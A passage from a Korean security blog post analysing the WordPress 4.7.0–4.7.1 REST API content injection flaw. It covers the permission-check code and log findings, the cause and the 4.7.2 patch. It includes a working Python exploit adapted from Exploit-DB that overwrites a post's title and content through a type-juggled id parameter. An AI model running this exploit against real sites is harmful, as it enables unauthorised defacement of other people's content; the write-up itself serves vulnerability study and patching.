-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;check_assign_terms_permission&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WP_Error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'rest_cannot_assign_term'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Sorry, you are not allowed to assign the provided terms.'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'status'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rest_authorization_required_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;실제 Exploit Code를 실행하고 게시물의 내용이 변경되는 것을 확인한 후 실제 권한 체크를 하는 로직을 어떻게 우회가 가능한지 확인하기 위해 서버의 로그로 확인해보았습니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x01_8.png&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;[그림 1-8]
-  update_item_permissions_check 로그 결과
-&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;실제 Exploit Code를 실행하면서 권한체크 부분에 대한 값들이 NULL과 true로 결과가 나오는 것을 확인하였으며 존재하지 않는 게시물, request 속성 값들이 NULL 인것을 확인하였고 if문 비교 피연산자들이 false 결과를 나타내며 권한체크 로직이 true의 결과가 나오는 것을 확인할 수 있었습니다.&lt;/p&gt;
-
-&lt;p&gt;Exploit-DB에 공개된 해당 취약점 POC코드를 분석하고 간단하게 커스텀마이징하여 아래와 같은 코드로 공격으로 사용할 수 있습니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;                        &lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;title&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;raw_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Title Input&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;raw_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Content Input:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://IP/wordpress/index.php/wp-json/wp/v2/posts/4/?id=4abc&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;                       &lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;title&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;content&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;'content-Type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;application/json&quot;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;  &lt;/span&gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;strong&gt;패치 및 대응방안&lt;/strong&gt;
-&lt;br /&gt;
-Privilege Escalation / Content Injection 취약점이 발생하는 핵심적인 원인은 존재하지 않는 게시물에 대한 검증 로직이 미흡하고, 수정하는 게시물을 식별하는 값에서 잘못된 형변환(Cascading)으로 그대로 수정이 되는 부분으로 사용자의 입력 값 검증에서 사소한 실수가 서비스에 많은 영향을 끼칠 수 있으며 세심한 입력 값 검증이 필요하다는 것을 알 수 있습니다.&lt;br /&gt;&lt;br /&gt;
-해당 취약점은 다음 버전인 4.7.2에서 바로 패치가 됐으며 update_item 함수의 형변환(Cascading) 라인이 삭제 되고, 추가적인 유형성 검사 로직이 추가된 것을 확인하였습니다.
-&lt;br /&gt;&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;References&lt;/strong&gt;
-&lt;br /&gt;
-https://www.twistlock.com/2017/06/08/wordpress-4-7-04-7-1/
-https://www.exploit-db.com/exploits/41223/
-https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html&lt;/li&gt;
-&lt;/ul&gt;</content>
-
-      
-      
-      
-      
-      
-
-      <author>
-          <name>Hackyu</name>
-        
-        
-      </author>
-
-      
-
-      
-        <category term="Posts" />
-      
-
-      
-        <summary type="html">Privilege Escalation / Content Injection On Wordpress 4.7.0 ~ 4.7.1</summary>
       
 
       
